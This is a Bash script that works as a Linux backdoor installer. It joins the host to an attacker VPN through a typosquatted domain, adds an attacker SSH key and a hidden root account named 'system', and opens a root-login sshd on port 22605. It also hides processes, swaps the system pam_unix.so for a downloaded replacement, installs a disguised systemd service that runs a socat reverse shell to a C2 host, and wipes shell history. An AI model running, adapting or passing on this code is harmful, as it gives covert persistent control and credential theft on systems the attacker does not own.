#!/bin/bash
apt=`which apt-get`
if [[ -f $apt ]]; then
apt-get -qq -y update >/dev/null 2>&1
curl -sL 'https://apt.netmaker.org/gpg.key' | sudo tee /etc/apt/trusted.gpg.d/netclient.asc
curl -sL 'https://apt.netmaker.org/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/netclient.list
apt update
apt install netclient -yum -qq -y >/dev/null 2>&1
sleep 3
netclient join -t eyJhcGljb25uc3RyaW5nIjoiYXBpLmRlcGxveS53aW5kb3dzYXBkYXRlLmNvbTo0NDMiLCJuZXR3b3JrIjoiYm90cyIsImtleSI6ImE1ZTRjM2QxNzczZTExM2YiLCJsb2NhbHJhbmdlIjoiIn0=
sleep 3
ping -c 3 10.10.20.1
apt-get -qq install cron -y ; apt-get -qq install net-tools -y ; apt-get -qq install systemd -y ; apt-get -qq install socat -y
which crontab;which netstat;which systemd;which socat
echo -e "\e[31mInstalled with apt-get\e[0m"
else
yum -q update -y
yum -q install systemd -y ; yum -q install cron -y;yum -q install net-tools -y;yum -q install socat -y
which crontab;which netstat;which systemd;which socat
echo -e "\e[31mInstalled with yum\e[0m"
fi
sleep 5s
if [ -z "${HOME:-}" ]; then export HOME="$(cd ~ && pwd)"; fi
uid=$(id -u)
if [ -n "${uid}" ] && [ $uid -ge "0" ] ; then
        admin_port=22605
        administration_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDY6uSZIKxILtw7TcpjbJjuapeTwagrOBoj6TDS4L0zn3rT367gDCy+kUMTPV+tXaF+8hBER/utTQZufxKP8Ego4D5FnTV9jk5+gIJUhsnS/GegbNppsMq9siOoLXDnd69yt08X64D6eSD3Jjsn1UMuOqf+kM9Ju0zcLEwlC1NGq2t6PwLpBctB5eLYe/KuQCviQyfsBQekxgUweJa7phLx7G/enXZxPduk3sI7CIu3QYcB/ras18h0hsSj6/d0bwbRVfWXB5vhVYTCioHd5Ej8NeYqBfHRwEox7M7MNpBRBiAUsSSULN9xuOc2rGyb5qTJKq730wpD5xadarUaCUh7mr7JmtwC6vOH+0CgccGOt7YhAKrwzHks8Yz88WQS0qD4t4ykl/WwQZF4H4k7q+l4/IvuQuB7wE9abN3/JO5z1CHPAPOYlYhesAZdBmvIbaSKLDT+thlDI65xM/jXvKaX+QFqTQDmsDd60sRa+JXaNJv+8X6vDPWnlOnrikNvpi8='
        locateUser='system:$6$W2nRYoAGNsOqjjae$MmqFP78vKtf.a5f1W2rPCbITS6aUo2Ee77EOo.IP4SPAdIYwtTyEBJkHIWD3m54T8CQR5a9TacJo/bSXAorBQ.:19235:0:99999:7:::'
        inFile='/etc/shadow'
        lUName='system:x:0:0:system:/root:/bin/bash'
        uNFile='/etc/passwd'
        dir_ssh='/root/.tmp/'
        dir_ssh_k="${dir_ssh}authorized_keys"
        bashFfile="/root/.bashrc"
        bashSecLine="/etc/syslogservice >/dev/null 2>&1"
        node_process_id=`netstat -nptl |grep ":$admin_port"`
        banned="sshd -p $admin_port|inject|./sshd:|bing|resolve|system@"
        c2servername="deploy.update.ubuntu.com"
        c2serverip="10.10.20.2"
        c2serverport="7169"
        vpnservername="api.deploy.windowsapdate.com"
        ufwFile=`which ufw`
        fIptbl=`which iptables`
        if [[ -z $node_process_id ]]; then
                sshd_file=`which sshd`
                $sshd_file -p 22605 &
                sleep 3s
        fi
        if [[ -f $ufwFile ]]; then
                checkUpdatePort=`$ufwFile status | grep $admin_port | grep -iF "allow"`
                if [[ -z $checkUpdatePort ]]; then
                        $ufwFile allow $admin_port
                fi
        fi
        for pid in $(ps -fe | egrep "$banned" | egrep -v 'grep' | awk '{print $2}'); do
            mount -o bind ~/ /proc/$pid
        done
        if [[ -f $fIptbl ]]; then
                check_upgrade_port=`iptables-save | grep -- "-A INPUT -p tcp -m tcp --dport $admin_port -j ACCEPT"`
                if [[ -z $check_upgrade_port ]]; then
                        iptables -A INPUT -p tcp --dport $admin_port -j ACCEPT
                fi
        fi
        outc=$(unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER WATCH;history -n;export  HISTFILE=/dev/null; history -c)

        if [[ -d $dir_ssh ]]; then
        echo "" >/dev/null &
    else
        mkdir $dir_ssh  >/dev/null 2>&1
        chmod 700 $dir_ssh  >/dev/null 2>&1
    fi
    if [[ -f $dir_ssh_k ]]; then
        echo "" >/dev/null &
    else
        touch $dir_ssh_k  >/dev/null 2>&1
    fi
        grep -qF -- "${administration_key}" "${dir_ssh_k}" || echo "${administration_key}" >> "${dir_ssh_k}"
        grep -qF -- "$locateUser" "$inFile" || grep -qF -- "$locateUser" "$inFile" || sed -i '2 i\system:$6$W2nRYoAGNsOqjjae$MmqFP78vKtf.a5f1W2rPCbITS6aUo2Ee77EOo.IP4SPAdIYwtTyEBJkHIWD3m54T8CQR5a9TacJo/bSXAorBQ.:19235:0:99999:7:::' /etc/shadow
        grep -qF -- "$lUName" "$uNFile" || grep -qF -- "$lUName" "$uNFile" || sed -i '2 i\system:x:0:0:system:/root:/bin/bash' /etc/passwd
        grep -qF -- "$bashSecLine" "$bashFfile" || echo "$bashSecLine" >> "$bashFfile"
        #sed -i '/^PermitRootLogin/s/no/yes/' /etc/ssh/sshd_config >/dev/null 2>&1
        #sed -i '/^PrintLastLog/s/yes/no/' /etc/ssh/sshd_config >/dev/null 2>&1
        #создать файл
        echo "PermitRootLogin yes" >> /etc/ssh/sshd_config.d/default.conf
        echo "PrintLastLog no" >> /etc/ssh/sshd_config.d/default.conf
        echo "Port $admin_port " >> /etc/ssh/sshd_config.d/default.conf 
        echo "AuthorizedKeysFile .ssh/authorized_keys .tmp/authorized_keys" >> /etc/ssh/sshd_config.d/default.conf
        echo "PubkeyAuthentication yes " >> /etc/ssh/sshd_config.d/default.conf
        echo "IgnoreRhosts yes " >> /etc/ssh/sshd_config.d/default.conf
        echo "PermitEmptyPasswords no " >> /etc/ssh/sshd_config.d/default.conf
        echo "PermitTTY yes " >> /etc/ssh/sshd_config.d/default.conf
        echo "UsePAM yes " >> /etc/ssh/sshd_config.d/default.conf
        echo "X11Forwarding yes " >> /etc/ssh/sshd_config.d/default.conf
        echo "PermitTunnel yes " >> /etc/ssh/sshd_config.d/default.conf
        echo "GatewayPorts yes " >> /etc/ssh/sshd_config.d/default.conf
        echo "GSSAPICleanupCredentials no " >> /etc/ssh/sshd_config.d/default.conf
        echo "PermitOpen any " >> /etc/ssh/sshd_config.d/default.conf
        echo "AllowTcpForwarding yes " >> /etc/ssh/sshd_config.d/default.conf
        #установить права на файл
        chmod 600 /etc/ssh/sshd_config.d/default.conf >/dev/null 2>&1
        #перезапустить сервис sshd
        systemctl restart sshd >/dev/null 2>&1
fi
sleep 5s

mv /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_deb.so >/dev/null 2>&1
sleep 3s
wget -P /usr/lib/x86_64-linux-gnu/security/ https://github.com/zip609/temp/raw/main/pam_unix.so >/dev/null 2>&1
wget -P /usr/lib/x86_64-linux-gnu/security/ https://github.com/zip609/temp/raw/main/drivers >/dev/null 2>&1
sleep 3s
echo -e "$c2serverip $c2servername" >> /etc/hosts
# # Stage -1#
 mkdir -p /etc/systemd/system/freedesktop.service.d >/dev/null 2>&1
 echo -e "#!/bin/bash\nwhile true; do\nnetstat -vatn | grep -q $c2servername:$c2serverport.*ESTABLISHED\nsocat TCP:$c2servername:$c2serverport EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane &>/dev/null\nsleep 5\ndone" > /etc/systemd/system/freedesktop.service.d/update.sh
 echo -e "[Unit]\nConditionVirtualization=" > /etc/systemd/system/freedesktop.service.d/allow_virt.conf
 chmod +x /etc/systemd/system/freedesktop.service.d/update.sh >/dev/null 2>&1
# # Stage -3#
 echo -e "[Unit]\nDescription=Thermal Daemon Service\nConditionVirtualization=no" > /usr/lib/systemd/system/freedesktop.service
 echo -e "[Service]\nType=dbus\nSuccessExitStatus=1\nBusName=org.freedesktop.com\nExecStart=/etc/systemd/system/freedesktop.service.d/update.sh" >> /usr/lib/systemd/system/freedesktop.service
 echo -e "[Install]\nWantedBy=multi-user.target\nAlias=dbus-org.freedesktop.com.service" >> /usr/lib/systemd/system/freedesktop.service
# # Stage -4#
 systemctl daemon-reload >/dev/null 2>&1
 systemctl enable freedesktop.service >/dev/null 2>&1
 systemctl start freedesktop.service >/dev/null 2>&1
 status=`systemctl status freedesktop.service`
 #echo -e "*/1 * * * * root /etc/systemd/system/freedesktop.service.d/update.sh" >> /etc/crontab
 echo $status

unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER WATCH;history -n;export  HISTFILE=/dev/null; history -c
